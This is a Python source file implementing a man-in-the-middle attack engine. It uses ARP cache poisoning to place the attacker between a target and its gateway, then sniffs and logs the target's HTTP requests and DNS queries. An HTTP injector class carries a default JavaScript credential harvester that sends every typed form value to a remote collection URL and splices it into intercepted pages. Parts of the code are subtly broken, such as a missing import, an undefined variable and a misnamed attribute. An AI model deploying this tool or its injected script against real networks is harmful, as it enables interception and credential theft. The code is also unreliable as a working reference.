"""
Man-in-the-Middle Attack Engine
───────────────────────────────
Performs MITM attacks to intercept and modify traffic between clients
and the internet. Supports ARP poisoning, DNS spoofing, and traffic injection.

Features:
  - ARP cache poisoning on local network
  - IP redirection for traffic interception
  - HTTP request/response modification
  - Payload injection into TCP streams
"""

import time
import threading
import subprocess
from collections import defaultdict

from scapy.all import ARP, IP, TCP, UDP, sniff, sendp, get_if_hwaddr, conf, srp
from scapy.layers.inet import Ether
from scapy.layers.dns import DNS, DNSQR, DNSRR

from .config import NETWORK_GW_IP, NETWORK_MASK, IS_WINDOWS, IS_LINUX, log


class MITMEngine:
    """
    Man-in-the-middle attack engine using ARP poisoning.
    Redirects traffic through attacker machine for inspection/modification.
    """

    def __init__(self, interface, target_ip=None, gateway_ip=None):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or "192.168.1.1"
        self.attacker_mac = get_if_hwaddr(interface)
        self.running = False
        self._poison_threads = []
        self._packet_handler_thread = None
        self._target_mac = None
        self._gateway_mac = None
        self._arp_cache = {}
        self._http_requests = []
        self._dns_queries = []

    def _get_mac(self, ip):
        """Get MAC address for IP using ARP."""
        if ip in self._arp_cache:
            return self._arp_cache[ip]

        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, verbose=False, iface=self.interface
        )

        for _, r in ans:
            self._arp_cache[ip] = r[ARP].hwsrc
            return r[ARP].hwsrc
        return None

    def _arp_poison_target(self, target_ip, target_mac, gateway_ip):
        """Poison target's ARP cache to think attacker is gateway."""
        while self.running:
            sendp(
                Ether(dst=target_mac) / ARP(
                    op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=self.attacker_mac
                ),
                verbose=False, iface=self.interface
            )
            time.sleep(2)

    def _arp_poison_gateway(self, gateway_ip, gateway_mac, target_ip):
        """Poison gateway's ARP cache to think attacker is target."""
        while self.running:
            sendp(
                Ether(dst=gateway_mac) / ARP(
                    op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=self.attacker_mac
                ),
                verbose=False, iface=self.interface
            )
            time.sleep(2)

    def start(self, target_ip=None, gateway_ip=None):
        """Start MITM attack."""
        if IS_WINDOWS:
            log.warning("MITM via ARP poisoning has limited support on Windows.")
            log.warning("Raw socket operations may require Npcap with WinPcap compatibility mode.")

        self.running = True
        self.target_ip = target_ip or self.target_ip
        self.gateway_ip = gateway_ip or self.gateway_ip

        if not self.target_ip:
            log.error("No target IP specified")
            return False

        # Get MAC addresses
        log.info(f"Resolving MAC addresses for {self.target_ip} and {self.gateway_ip}...")
        self._target_mac = self._get_mac(self.target_ip)
        self._gateway_mac = self._get_mac(self.gateway_ip)

        if not self._target_mac:
            log.error(f"Could not resolve target MAC for {self.target_ip}")
            return False
        if not self._gateway_mac:
            log.error(f"Could not resolve gateway MAC for {self.gateway_ip}")
            return False

        log.info(f"Target: {self.target_ip} ({self._target_mac})")
        log.info(f"Gateway: {self.gateway_ip} ({self._gateway_mac})")

        # Start ARP poisoning threads
        self._poison_threads = [
            threading.Thread(
                target=self._arp_poison_target,
                args=(self.target_ip, self._target_mac, self.gateway_ip),
                daemon=True
            ),
            threading.Thread(
                target=self._arp_poison_gateway,
                args=(self.gateway_ip, self._gateway_mac, self.target_ip),
                daemon=True
            )
        ]

        for t in self._poison_threads:
            t.start()

        # Start packet sniffing
        self._packet_handler_thread = threading.Thread(
            target=self._sniff_traffic,
            daemon=True
        )
        self._packet_handler_thread.start()

        log.info(f"MITM attack active: {self.target_ip} <-> {self.attacker_mac} <-> {self.gateway_ip}")
        return True

    def _sniff_traffic(self):
        """Sniff and process intercepted traffic."""
        def packet_handler(pkt):
            if not pkt.haslayer(IP):
                return

            ip_layer = pkt[IP]
            src_ip = ip_layer.src
            dst_ip = ip_layer.dst

            # Log HTTP requests
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                payload = str(pkt[Raw].load)
                if "GET " in payload or "POST " in payload:
                    self._http_requests.append({
                        "src": src_ip, "dst": dst_ip, "payload": payload,
                        "timestamp": time.time()
                    })
                    log.info(f"HTTP: {src_ip} -> {dst_ip}")

            # Log DNS queries
            if pkt.haslayer(DNS) and pkt[DNS].qd:
                qname = pkt[DNS].qd.qname.decode()
                self._dns_queries.append({
                    "src": src_ip, "qname": qname, "timestamp": time.time()
                })
                log.info(f"DNS: {src_ip} -> {qname}")

        sniff(
            iface=self.interface,
            prn=packet_handler,
            store=False,
            stop_filter=lambda x: not self.running
        )

    def stop(self):
        """Stop MITM attack and restore ARP tables."""
        self.running = False

        # Restore ARP tables
        if self._target_mac and self._gateway_ip:
            sendp(
                Ether(dst=self._target_mac) / ARP(
                    op=2, psrc=self.gateway_ip, pdst=self.target_ip,
                    hwsrc=self._gateway_mac
                ),
                verbose=False, iface=self.interface
            )

        if self._gateway_mac and self.target_ip:
            sendp(
                Ether(dst=self._gateway_mac) / ARP(
                    op=2, psrc=self.target_ip, pdst=self.gateway_ip,
                    hwsrc=self._target_mac
                ),
                verbose=False, iface=self.interface
            )

        log.info("MITM attack stopped, ARP tables restored")

    def get_http_requests(self):
        """Return captured HTTP requests."""
        return self._http_requests

    def get_dns_queries(self):
        """Return captured DNS queries."""
        return self._dns_queries

    def get_stats(self):
        """Return MITM statistics."""
        return {
            "http_requests": len(self._http_requests),
            "dns_queries": len(self._dns_queries),
            "targets": 1 if self.target_ip else 0,
            "running": self.running
        }


class HTTPInjector(MITMEngine):
    """
    HTTP traffic injector - modifies HTTP responses to inject payloads.
    """

    def __init__(self, interface, inject_html=None, inject_js=None):
        super().__init__(interface)
        self.inject_html = inject_html
        self.inject_js = inject_js or """
        <script>
            // Credential harvester
            document.addEventListener('input', function(e) {
                fetch('http://10.0.0.1/log', {
                    method: 'POST',
                    body: JSON.stringify({field: e.target.name, value: e.target.value})
                });
            });
        </script>
        """

    def _modify_response(self, pkt):
        """Modify HTTP response to inject payload."""
        if not pkt.haslayer(Raw):
            return None

        payload = bytes(pkt[Raw].load)
        if b"HTTP/1.1 200 OK" not in payload:
            return None

        # Find HTML body and inject
        headers, _, body = payload.partition(b"\r\n\r\n")
        if b"</body>" in body:
            injection = self.inject_js.encode()
            body = body.replace(b"</body>", injection + b"</body>")
        else:
            body += self.inject_html.encode() if self.inject_html else injection

        return headers + b"\r\n\r\n" + body

    def start(self, *args, **kwargs):
        log.info("HTTP Injector started - payloads will be injected into responses")
        return super().start(*args, **kwargs)